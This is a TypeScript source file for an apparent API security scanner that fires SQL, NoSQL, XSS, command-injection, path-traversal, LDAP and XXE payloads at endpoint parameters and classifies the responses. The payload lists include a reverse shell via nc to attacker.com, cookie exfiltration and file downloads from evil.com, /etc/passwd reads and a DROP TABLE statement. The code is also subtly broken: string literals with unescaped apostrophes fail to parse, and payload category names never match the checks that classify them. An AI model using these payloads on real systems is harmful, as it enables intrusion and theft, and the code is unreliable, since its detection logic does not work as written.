import axios, { AxiosResponse } from 'axios';
import { logger } from '../utils/logger';

export interface Parameter {
  name: string;
  type: 'string' | 'number' | 'boolean' | 'array' | 'object' | 'unknown';
  location: 'query' | 'body' | 'header' | 'path' | 'form';
  required?: boolean;
  format?: string;
  example?: any;
  constraints?: {
    minLength?: number;
    maxLength?: number;
    pattern?: string;
    minimum?: number;
    maximum?: number;
    enum?: any[];
  };
}

export interface ParameterVulnerability {
  parameter: Parameter;
  vulnerability: {
    type: string;
    name: string;
    description: string;
    severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
    confidence: number;
    cwe: string;
    owasp: string;
  };
  payload: {
    original: any;
    malicious: any;
    technique: string;
    category: string;
  };
  evidence: {
    request: string;
    response: string;
    statusCode: number;
    responseTime: number;
    differenceDetected: boolean;
    errorSignatures?: string[];
    timeDelayDetected?: boolean; // Added for time-based SQLi
  };
  impact: string;
  recommendation: string;
}

export interface PayloadGenerationOptions {
  useAI: boolean;
  maxPayloads: number;
  includeAdvanced: boolean;
  targetLanguage?: 'sql' | 'nosql' | 'javascript' | 'python' | 'php' | 'all';
  customPatterns?: string[];
}

export class ParameterTester {
  private readonly sqlInjectionPayloads: string[] = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users--",
    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
    "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "' OR 'x'='x",
    "admin'--",
    "' OR 1=1#",
    "' HAVING 1=1--",
    "' GROUP BY 1--",
    "' ORDER BY 1--"
  ];

  private readonly nosqlInjectionPayloads: any[] = [
    { "$ne": null },
    { "$regex": ".*" },
    { "$where": "1==1" },
    { "$gt": "" },
    { "$exists": true },
    { "$in": ["admin", "user"] },
    { "$or": [{"a": 1}, {"b": 2}] },
    { "$and": [{"a": 1}, {"b": 2}] },
    "'; return db.users.find(); //",
    { "$func": "var_dump" }
  ];

  private readonly xssPayloads: string[] = [
    "<script>alert('XSS')</script>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
    "\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "<script>fetch('http://evil.com/'+document.cookie)</script>"
  ];

  private readonly commandInjectionPayloads: string[] = [
    "; ls -la",
    "| whoami",
    "&& cat /etc/passwd",
    "|| id",
    "`id`",
    "$(whoami)",
    "; cat /etc/hosts",
    "| nc -e /bin/sh attacker.com 4444",
    "&& curl http://evil.com/$(whoami)",
    "; sleep 10",
    "| ping -c 10 127.0.0.1",
    "&& echo 'vulnerable' > /tmp/test",
    "|| wget http://evil.com/shell.php"
  ];

  private readonly pathTraversalPayloads: string[] = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "/var/www/../../etc/passwd",
    "file:///etc/passwd",
    "php://filter/read=convert.base64-encode/resource=../../../etc/passwd"
  ];

  private readonly ldapInjectionPayloads: string[] = [
    "*",
    "*)(&",
    "*)(uid=*)(&",
    "*)(|(uid=*))",
    "*)(|(password=*))",
    "admin)(&(password=*))",
    "*)(|(&(objectClass=person)(uid=*)))",
    "*)(|(objectClass=*))"
  ];

  private readonly xxePayloads: string[] = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/evil.dtd">]><root>&test;</root>',
    '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo/>'
  ];

  private readonly errorSignatures: Record<string, string[]> = {
    sql: [
      'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL', 'Warning: pg_',
      'valid MySQL result', 'MySqlClient', 'Microsoft OLE DB Provider',
      'Unclosed quotation mark', 'quoted string not properly terminated'
    ],
    nosql: [
      'MongoError', 'CastError', 'ValidationError', 'BSONError',
      'E11000 duplicate key', 'MongoNetworkError'
    ],
    xss: [
      'script', 'alert', 'onerror', 'onload', 'javascript:'
    ],
    command: [
      'sh: ', 'bash: ', 'cmd: ', 'command not found', '/bin/sh',
      'Permission denied', 'No such file or directory'
    ],
    path_traversal: [
      'root:x:', 'daemon:x:', 'bin:x:', '[boot loader]', 'WINDOWS',
      'Program Files', 'Documents and Settings'
    ],
    ldap: [
      'Invalid DN syntax', 'LDAP: error code', 'LdapErr',
      'com.sun.jndi.ldap', 'javax.naming.directory'
    ]
  };

  constructor(private options: PayloadGenerationOptions = { useAI: false, maxPayloads: 50, includeAdvanced: false }) {}

  async testParameter(
    endpoint: string,
    method: string,
    parameter: Parameter,
    baselineResponse?: AxiosResponse
  ): Promise<ParameterVulnerability[]> {
    
    logger.info(`Testing parameter: ${parameter.name} (${parameter.type}) at ${method} ${endpoint}`);
    const vulnerabilities: ParameterVulnerability[] = [];

    try {
      // Get baseline response if not provided
      if (!baselineResponse) {
        baselineResponse = await this.makeBaselineRequest(endpoint, method, parameter);
      }

      // Generate AI-enhanced payloads
      const payloads = await this.generatePayloads(parameter);

      // Test each payload category
      for (const payload of payloads) {
        try {
          const vulnerability = await this.testPayload(
            endpoint,
            method,
            parameter,
            payload,
            baselineResponse
          );

          if (vulnerability) {
            vulnerabilities.push(vulnerability);
          }

        } catch (error: any) {
          logger.warn(`Payload test failed: ${error.message}`);
        }
      }

      // AI-enhanced analysis for complex vulnerabilities
      if (this.options.useAI && vulnerabilities.length > 0) {
        await this.enhanceVulnerabilityAnalysis(vulnerabilities);
      }

      return vulnerabilities;

    } catch (error: any) {
      logger.error(`Parameter testing failed: ${error.message}`);
      return [];
    }
  }

  private async generatePayloads(parameter: Parameter): Promise<Array<{
    value: any;
    technique: string;
    category: string;
    description: string;
  }>> {
    const payloads: Array<{
      value: any;
      technique: string;
      category: string;
      description: string;
    }> = [];

    // SQL Injection payloads
    if (parameter.type === 'string' || parameter.type === 'unknown') {
      this.sqlInjectionPayloads.slice(0, 10).forEach(payload => {
        payloads.push({
          value: payload,
          technique: 'SQL_INJECTION_ERROR_BASED',
          category: 'SQL_INJECTION',
          description: 'Tests for SQL Injection using common error-based payloads.'
        });
      });
      // Add boolean-based SQLi payloads
      payloads.push(
        { value: `${parameter.example || ''}' AND 1=1--`, technique: 'SQL_INJECTION_BOOLEAN_BASED_TRUE', category: 'SQL_INJECTION', description: 'Tests for SQL Injection using boolean-based true condition.' },
        { value: `${parameter.example || ''}' AND 1=2--`, technique: 'SQL_INJECTION_BOOLEAN_BASED_FALSE', category: 'SQL_INJECTION', description: 'Tests for SQL Injection using boolean-based false condition.' }
      );
      // Add time-based SQLi payloads
      payloads.push(
        { value: `${parameter.example || ''}' OR SLEEP(5)--`, technique: 'SQL_INJECTION_TIME_BASED_OR', category: 'SQL_INJECTION', description: 'Tests for time-based SQL Injection using OR condition.' },
        { value: `${parameter.example || ''}'; WAITFOR DELAY '00:00:05'--`, technique: 'SQL_INJECTION_TIME_BASED_WAITFOR', category: 'SQL_INJECTION', description: 'Tests for time-based SQL Injection using WAITFOR DELAY.' }
      );
    }

    // NoSQL Injection payloads
    if (parameter.type === 'object' || parameter.type === 'string') {
      this.nosqlInjectionPayloads.slice(0, 8).forEach(payload => {
        payloads.push({
          value: payload,
          technique: 'NoSQL Injection',
          category: 'injection',
          description: 'NoSQL injection attempt to bypass filters or extract data'
        });
      });
    }

    // XSS payloads
    if (parameter.type === 'string') {
      this.xssPayloads.slice(0, 8).forEach(payload => {
        payloads.push({
          value: payload,
          technique: 'Cross-Site Scripting (XSS)',
          category: 'injection',
          description: 'XSS payload to execute malicious scripts'
        });
      });
    }

    // Command Injection payloads
    if (parameter.type === 'string') {
      this.commandInjectionPayloads.slice(0, 8).forEach(payload => {
        payloads.push({
          value: payload,
          technique: 'Command Injection',
          category: 'injection',
          description: 'Command injection to execute system commands'
        });
      });
    }

    // Path Traversal payloads
    if (parameter.name.toLowerCase().includes('file') || 
        parameter.name.toLowerCase().includes('path') ||
        parameter.name.toLowerCase().includes('url')) {
      this.pathTraversalPayloads.slice(0, 6).forEach(payload => {
        payloads.push({
          value: payload,
          technique: 'Path Traversal',
          category: 'traversal',
          description: 'Path traversal attempt to access unauthorized files'
        });
      });
    }

    // Type confusion payloads
    if (parameter.type === 'number') {
      ['string', 'null', [], {}, true, false].forEach(payload => {
        payloads.push({
          value: payload,
          technique: 'Type Confusion',
          category: 'logic',
          description: 'Type confusion to bypass validation logic'
        });
      });
    }

    // Buffer overflow payloads
    if (parameter.type === 'string' && parameter.constraints?.maxLength) {
      const overflowLength = parameter.constraints.maxLength * 2;
      payloads.push({
        value: 'A'.repeat(overflowLength),
        technique: 'Buffer Overflow',
        category: 'overflow',
        description: 'Buffer overflow attempt with excessive input length'
      });
    }

    // AI-enhanced payload generation
    if (this.options.useAI) {
      const aiPayloads = await this.generateAIEnhancedPayloads(parameter);
      payloads.push(...aiPayloads);
    }

    // Limit payload count
    return payloads.slice(0, this.options.maxPayloads);
  }

  private async generateAIEnhancedPayloads(parameter: Parameter): Promise<Array<{
    value: any;
    technique: string;
    category: string;
    description: string;
  }>> {
    // Simulated AI-enhanced payload generation
    // In a real implementation, this would use ML models
    const aiPayloads: Array<{
      value: any;
      technique: string;
      category: string;
      description: string;
    }> = [];

    // Context-aware payload generation based on parameter name
    const paramName = parameter.name.toLowerCase();
    
    if (paramName.includes('email')) {
      aiPayloads.push(
        {
          value: 'admin@localhost.localdomain',
          technique: 'Email Enumeration',
          category: 'enumeration',
          description: 'Common admin email for privilege escalation'
        },
        {
          value: '"<script>alert(1)</script>"@evil.com',
          technique: 'Email XSS',
          category: 'injection',
          description: 'XSS payload embedded in email format'
        }
      );
    }

    if (paramName.includes('id') || paramName.includes('user')) {
      aiPayloads.push(
        {
          value: '../admin',
          technique: 'ID Traversal',
          category: 'traversal',
          description: 'Attempt to access admin user context'
        },
        {
          value: '0',
          technique: 'Admin ID Guessing',
          category: 'enumeration',
          description: 'Common admin user ID value'
        }
      );
    }

    if (paramName.includes('password')) {
      aiPayloads.push(
        {
          value: '',
          technique: 'Empty Password',
          category: 'authentication',
          description: 'Empty password bypass attempt'
        },
        {
          value: { '$ne': null },
          technique: 'NoSQL Password Bypass',
          category: 'injection',
          description: 'NoSQL injection to bypass password check'
        }
      );
    }

    // Pattern-based AI payload generation
    if (parameter.format === 'date') {
      aiPayloads.push(
        {
          value: '1970-01-01T00:00:00Z',
          technique: 'Epoch Date Injection',
          category: 'logic',
          description: 'Unix epoch date to trigger edge cases'
        },
        {
          value: '9999-12-31T23:59:59Z',
          technique: 'Future Date Injection',
          category: 'logic',
          description: 'Far future date to test date handling'
        }
      );
    }

    return aiPayloads;
  }

  private async testPayload(
    endpoint: string,
    method: string,
    parameter: Parameter,
    payload: any,
    baselineResponse: AxiosResponse
  ): Promise<ParameterVulnerability | null> {
    const startTime = Date.now();
    let response: AxiosResponse;
    let responseTime: number;
    let opposingResponse: AxiosResponse | undefined; // For boolean-based SQLi

    try {
      response = await this.makeRequest(endpoint, method, parameter, payload.value);
      responseTime = Date.now() - startTime;
    } catch (error: any) {
      logger.warn(`Request failed for payload ${payload.value}: ${error.message}`);
      if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT' || error.code === 'ERR_NETWORK') {
        return {
          parameter,
          vulnerability: {
            type: 'DENIAL_OF_SERVICE',
            name: 'Potential Denial of Service / Unhandled Exception',
            description: `The application returned a connection error or timed out when processing payload: ${payload.value}`,
            severity: 'HIGH',
            confidence: 0.7,
            cwe: 'CWE-400',
            owasp: 'A06:2021 – Vulnerable and Outdated Components'
          },
          payload: {
            original: parameter.example,
            malicious: payload.value,
            technique: payload.technique,
            category: payload.category
          },
          evidence: {
            request: `${method} ${endpoint} with ${parameter.name}=${payload.value}`,
            response: `Error: ${error.message}`,
            statusCode: error.response?.status || 0,
            responseTime: Date.now() - startTime,
            differenceDetected: true,
            errorSignatures: [error.code]
          },
          impact: 'Service disruption or information disclosure through errors',
          recommendation: 'Implement robust error handling and input validation.'
        };
      }
      return null;
    }

    // If it's a boolean-based SQLi payload, send the opposing one
    if (payload.technique.startsWith('SQL_INJECTION_BOOLEAN_BASED_TRUE')) {
      const opposingPayloadValue = `${parameter.example || ''}' AND 1=2--`;
      try {
        opposingResponse = await this.makeRequest(endpoint, method, parameter, opposingPayloadValue);
      } catch (error: any) {
        logger.warn(`Opposing request for boolean-based payload failed: ${error.message}`);
      }
    } else if (payload.technique.startsWith('SQL_INJECTION_BOOLEAN_BASED_FALSE')) {
        const opposingPayloadValue = `${parameter.example || ''}' AND 1=1--`;
        try {
            opposingResponse = await this.makeRequest(endpoint, method, parameter, opposingPayloadValue);
        } catch (error: any) {
            logger.warn(`Opposing request for boolean-based payload failed: ${error.message}`);
        }
    }

    // Pass all relevant data to analyzeResponse for comprehensive classification
    return this.analyzeResponse(parameter, payload, response, baselineResponse, responseTime, opposingResponse);
  }

  private analyzeResponse(
    parameter: Parameter,
    payload: any,
    response: AxiosResponse,
    baselineResponse: AxiosResponse,
    responseTime: number,
    opposingResponse?: AxiosResponse // New parameter for boolean-based
  ): ParameterVulnerability | null {
    const responseBody = response.data ? JSON.stringify(response.data) : '';
    const baselineBody = baselineResponse.data ? JSON.stringify(baselineResponse.data) : '';

    let detectedErrors = this.detectErrorSignatures(responseBody, payload.category);
    let contentDiff = this.analyzeContentDifference(responseBody, baselineBody);
    let statusCodeDiff = response.status !== baselineResponse.status;
    let sizeDiff = responseBody.length !== baselineBody.length;
    let timingAnomaly = false;

    // Time-based SQLi detection
    if (payload.technique.startsWith('SQL_INJECTION_TIME_BASED')) {
        const threshold = 4000; // Expected delay is 5000ms, use 4000ms as threshold
        if (responseTime >= threshold) {
            timingAnomaly = true;
            detectedErrors.push('Significant time delay detected');
        }
    }

    // Boolean-based SQLi detection
    if (payload.technique.startsWith('SQL_INJECTION_BOOLEAN_BASED') && opposingResponse) {
        const opposingResponseBody = opposingResponse.data ? JSON.stringify(opposingResponse.data) : '';
        const booleanContentDiff = this.analyzeContentDifference(responseBody, opposingResponseBody);
        const booleanStatusCodeDiff = response.status !== opposingResponse.status;
        const booleanSizeDiff = responseBody.length !== opposingResponseBody.length;

        if ((booleanContentDiff.suspicious && booleanContentDiff.reason !== 'Minor differences') || booleanStatusCodeDiff || booleanSizeDiff) {
            detectedErrors.push('Boolean-based response difference detected');
            // Overwrite general content/status/size diff for this specific case, as it's a stronger indicator
            contentDiff.suspicious = true;
            contentDiff.reason = booleanContentDiff.reason;
            statusCodeDiff = true; // Force true if boolean diff
            sizeDiff = true; // Force true if boolean diff
        }
    }

    // XSS Reflected Payload Detection
    if (payload.category === 'XSS' && typeof payload.value === 'string' && responseBody.includes(payload.value)) {
        detectedErrors.push('XSS payload reflected in response');
        // This is a strong indicator, mark differenceDetected
        contentDiff.suspicious = true; // Indicate a suspicious content difference
    }

    // Command Injection Output Detection
    if (payload.category === 'COMMAND_INJECTION') {
        const commandOutputSignatures = [
            'uid=', 'gid=', 'root:x:', 'daemon:x:', 'bin:x:', // Unix/Linux common outputs
            'system32', 'windows', 'Program Files', // Windows common directories
            'total', // from 'ls -la' or 'dir'
            '/bin/sh', '/bin/bash', 'cmd.exe', // shell paths
            'Volume in drive', 'Directory of' // Windows dir command
        ];
        const commandOutputDetected = commandOutputSignatures.some(sig => responseBody.includes(sig));
        if (commandOutputDetected) {
            detectedErrors.push('Command output detected in response');
            contentDiff.suspicious = true; // Indicate a suspicious content difference
        }
    }


    // Determine if vulnerability exists based on all indicators
    if (detectedErrors.length > 0 || statusCodeDiff || sizeDiff || timingAnomaly || contentDiff.suspicious) {
      const vulnerability = this.classifyVulnerability(payload, detectedErrors, {
        statusCodeDiff,
        sizeDiff,
        timingAnomaly,
        contentDiff: contentDiff.suspicious,
        responseTime
      });

      if (vulnerability) {
        return {
          parameter,
          vulnerability,
          payload: {
            original: parameter.example,
            malicious: payload.value,
            technique: payload.technique,
            category: payload.category
          },
          evidence: {
            request: `${payload.technique}: ${JSON.stringify(payload.value)}`,
            response: responseBody.substring(0, 500) + (responseBody.length > 500 ? '...' : ''),
            statusCode: response.status,
            responseTime,
            differenceDetected: true,
            errorSignatures: detectedErrors,
            timeDelayDetected: timingAnomaly // Add this to evidence
          },
          impact: this.getVulnerabilityImpact(vulnerability.type),
          recommendation: this.getVulnerabilityRecommendation(vulnerability.type)
        };
      }
    }

    return null;
  }

  private detectErrorSignatures(responseBody: string, category: string): string[] {
    const signatures: string[] = [];
    const lowercaseBody = responseBody.toLowerCase();

    // Check category-specific error signatures
    if (this.errorSignatures[category]) {
      for (const signature of this.errorSignatures[category]) {
        if (lowercaseBody.includes(signature.toLowerCase())) {
          signatures.push(signature);
        }
      }
    }

    // Check all error signatures if none found
    if (signatures.length === 0) {
      for (const [cat, sigs] of Object.entries(this.errorSignatures)) {
        for (const signature of sigs) {
          if (lowercaseBody.includes(signature.toLowerCase())) {
            signatures.push(`${cat}:${signature}`);
          }
        }
      }
    }

    return signatures;
  }

  private analyzeContentDifference(responseBody: string, baselineBody: string): { suspicious: boolean; reason?: string } {
    // Check for SQL injection indicators in response
    const sqlIndicators = ['syntax error', 'column', 'table', 'database', 'select', 'union'];
    const hasNewSqlContent = sqlIndicators.some(indicator => 
      responseBody.toLowerCase().includes(indicator) && 
      !baselineBody.toLowerCase().includes(indicator)
    );

    // Check for XSS reflection
    const hasScriptTags = responseBody.includes('<script>') && !baselineBody.includes('<script>');
    
    // Check for path traversal success
    const hasFileContent = responseBody.includes('root:') || responseBody.includes('[boot loader]');

    if (hasNewSqlContent) {
      return { suspicious: true, reason: 'SQL content detected' };
    }
    
    if (hasScriptTags) {
      return { suspicious: true, reason: 'Script tags reflected' };
    }
    
    if (hasFileContent) {
      return { suspicious: true, reason: 'System file content detected' };
    }

    return { suspicious: false };
  }

  private classifyVulnerability(payload: any, errorSignatures: string[], indicators: any): any {
    const { statusCodeDiff, sizeDiff, timingAnomaly, contentDiff, responseTime } = indicators;

    // Prioritize specific vulnerability types
    if (payload.category === 'SQL_INJECTION') {
        if (timingAnomaly) {
            return {
                type: 'SQL_INJECTION_TIME_BASED',
                name: 'Time-Based Blind SQL Injection',
                description: `The application's response time significantly increased (${responseTime}ms), indicating a potential time-based blind SQL Injection vulnerability.`,
                severity: 'HIGH',
                confidence: 0.85,
                cwe: 'CWE-89',
                owasp: 'A03:2021 – Injection'
            };
        }
        if (errorSignatures.includes('Boolean-based response difference detected')) {
      return {
                type: 'SQL_INJECTION_BOOLEAN_BASED',
                name: 'Boolean-Based SQL Injection',
                description: `The application responded differently to SQL 'TRUE' and 'FALSE' conditions, indicating a potential boolean-based SQL Injection vulnerability.`,
                severity: 'HIGH',
                confidence: 0.8,
        cwe: 'CWE-89',
        owasp: 'A03:2021 – Injection'
      };
    }
        if (errorSignatures.some(sig => this.errorSignatures.sql.includes(sig))) {
      return {
                type: 'SQL_INJECTION_ERROR_BASED',
                name: 'Error-Based SQL Injection',
                description: 'SQL error messages were detected in the application's response, indicating a potential error-based SQL Injection vulnerability.',
        severity: 'HIGH',
                confidence: 0.75,
                cwe: 'CWE-89',
        owasp: 'A03:2021 – Injection'
      };
    }
    } else if (payload.category === 'XSS') {
        if (errorSignatures.includes('XSS payload reflected in response') || errorSignatures.some(sig => this.errorSignatures.xss.includes(sig))) {
      return {
                type: 'XSS_REFLECTED',
                name: 'Reflected Cross-Site Scripting (XSS)',
                description: 'The XSS payload was reflected in the response or XSS-related patterns were detected, indicating a potential Reflected XSS vulnerability.',
        severity: 'HIGH',
                confidence: 0.9,
        cwe: 'CWE-79',
        owasp: 'A03:2021 – Injection'
      };
    }
    } else if (payload.category === 'COMMAND_INJECTION') {
        if (errorSignatures.includes('Command output detected in response') || errorSignatures.some(sig => this.errorSignatures.command.includes(sig))) {
      return {
                type: 'COMMAND_INJECTION',
        name: 'Command Injection',
                description: 'Command execution output or command-related error messages detected in the response, indicating a potential command injection vulnerability.',
        severity: 'CRITICAL',
                confidence: 0.95,
                cwe: 'CWE-77',
        owasp: 'A03:2021 – Injection'
      };
    }
    }
    else if (payload.category === 'NOSQL_INJECTION' && errorSignatures.some(sig => this.errorSignatures.nosql.includes(sig))) {
      return {
            type: 'NOSQL_INJECTION',
            name: 'NoSQL Injection',
            description: 'NoSQL error messages or unexpected query results were detected in the application's response, indicating a potential NoSQL Injection vulnerability.',
        severity: 'HIGH',
            confidence: 0.8,
            cwe: 'CWE-943',
            owasp: 'A03:2021 – Injection'
        };
    } else if (payload.category === 'PATH_TRAVERSAL' && errorSignatures.some(sig => this.errorSignatures.path_traversal.includes(sig))) {
        return {
            type: 'PATH_TRAVERSAL',
            name: 'Path Traversal',
            description: 'Directory content or system file paths were exposed in the application's response, indicating a potential Path Traversal vulnerability.',
            severity: 'MEDIUM',
        confidence: 0.7,
            cwe: 'CWE-22',
            owasp: 'A03:2021 – Injection'
        };
    } else if (payload.category === 'LDAP_INJECTION' && errorSignatures.some(sig => this.errorSignatures.ldap.includes(sig))) {
        return {
            type: 'LDAP_INJECTION',
            name: 'LDAP Injection',
            description: 'LDAP-specific error messages or unexpected directory query results were detected, indicating a potential LDAP Injection vulnerability.',
            severity: 'HIGH',
            confidence: 0.8,
            cwe: 'CWE-90',
        owasp: 'A03:2021 – Injection'
      };
    } else if (payload.category === 'XXE' && errorSignatures.some(sig => this.errorSignatures.xxe.includes(sig))) {
        return {
            type: 'XXE',
            name: 'XML External Entity (XXE)',
            description: 'XML parsing errors or external entity resolution detected, indicating a potential XXE vulnerability.',
            severity: 'CRITICAL',
            confidence: 0.9,
            cwe: 'CWE-611',
            owasp: 'A05:2021 – Security Misconfiguration'
        };
    }

    // Generic detection based on differences or general errors
    if (errorSignatures.length > 0) {
      return {
            type: 'GENERIC_ERROR_BASED_INJECTION',
            name: 'Generic Error-Based Injection',
            description: `Application returned an error indicating a potential injection vulnerability: ${errorSignatures.join(', ')}`,
        severity: 'MEDIUM',
        confidence: 0.6,
            cwe: 'CWE-74',
            owasp: 'A03:2021 – Injection'
        };
    }
    if (contentDiff || statusCodeDiff || sizeDiff || timingAnomaly) {
        return {
            type: 'GENERIC_DIFFERENCE_BASED_INJECTION',
            name: 'Generic Difference-Based Injection',
            description: 'The application's response differed significantly from the baseline, indicating a potential injection vulnerability.',
            severity: 'LOW',
            confidence: 0.5,
            cwe: 'CWE-20',
            owasp: 'A03:2021 – Injection'
      };
    }

    return null;
  }

  private getVulnerabilityImpact(type: string): string {
    const impacts: Record<string, string> = {
      'sql_injection': 'Unauthorized data access, data manipulation, potential system compromise',
      'nosql_injection': 'Authentication bypass, data extraction, unauthorized access',
      'xss': 'Session hijacking, credential theft, malicious script execution',
      'command_injection': 'Remote code execution, system compromise, data exfiltration',
      'path_traversal': 'Unauthorized file access, sensitive data exposure',
      'business_logic_error': 'Business process bypass, unauthorized operations',
      'denial_of_service': 'Service disruption, resource exhaustion'
    };

    return impacts[type] || 'Potential security impact requiring investigation';
  }

  private getVulnerabilityRecommendation(type: string): string {
    const recommendations: Record<string, string> = {
      'sql_injection': 'Use parameterized queries and input validation. Implement least privilege database access.',
      'nosql_injection': 'Sanitize inputs and use schema validation. Implement proper query construction.',
      'xss': 'Implement output encoding and Content Security Policy. Validate and sanitize all inputs.',
      'command_injection': 'Avoid system command execution. Use safe APIs and input validation.',
      'path_traversal': 'Validate file paths and use whitelisting. Implement proper access controls.',
      'business_logic_error': 'Review business logic validation and implement proper type checking.',
      'denial_of_service': 'Implement rate limiting and input validation. Monitor resource usage.'
    };

    return recommendations[type] || 'Implement proper input validation and security controls';
  }

  private async makeBaselineRequest(endpoint: string, method: string, parameter: Parameter): Promise<AxiosResponse> {
    const safeValue = this.generateSafeValue(parameter);
    return await this.makeRequest(endpoint, method, parameter, safeValue);
  }

  private async makeRequest(endpoint: string, method: string, parameter: Parameter, value: any): Promise<AxiosResponse> {
    const config: any = {
      method: method.toLowerCase(),
      url: endpoint,
      timeout: 10000,
      validateStatus: () => true,
      headers: {
        'User-Agent': 'API-Security-Scanner/1.0',
        'Accept': 'application/json, */*'
      }
    };

    // Add parameter based on location
    if (parameter.location === 'query') {
      config.params = { [parameter.name]: value };
    } else if (parameter.location === 'body') {
      config.data = { [parameter.name]: value };
      config.headers['Content-Type'] = 'application/json';
    } else if (parameter.location === 'header') {
      config.headers[parameter.name] = value;
    } else if (parameter.location === 'path') {
      config.url = endpoint.replace(`{${parameter.name}}`, encodeURIComponent(value));
    }

    return await axios(config);
  }

  private generateSafeValue(parameter: Parameter): any {
    switch (parameter.type) {
      case 'string':
        return parameter.example || 'test';
      case 'number':
        return parameter.example || 1;
      case 'boolean':
        return parameter.example || true;
      case 'array':
        return parameter.example || [];
      case 'object':
        return parameter.example || {};
      default:
        return 'test';
    }
  }

  private async enhanceVulnerabilityAnalysis(vulnerabilities: ParameterVulnerability[]): Promise<void> {
    // AI-enhanced post-processing of vulnerabilities
    // This could involve ML models for false positive reduction
    
    for (const vuln of vulnerabilities) {
      // Adjust confidence based on multiple factors
      if (vuln.evidence.errorSignatures && vuln.evidence.errorSignatures.length > 1) {
        vuln.vulnerability.confidence = Math.min(vuln.vulnerability.confidence + 0.1, 1.0);
      }

      // Cross-reference with known vulnerability patterns
      if (vuln.vulnerability.type === 'sql_injection' && vuln.evidence.responseTime > 3000) {
        vuln.vulnerability.name = 'Time-based Blind SQL Injection';
        vuln.vulnerability.confidence = Math.min(vuln.vulnerability.confidence + 0.05, 1.0);
      }
    }
  }
} 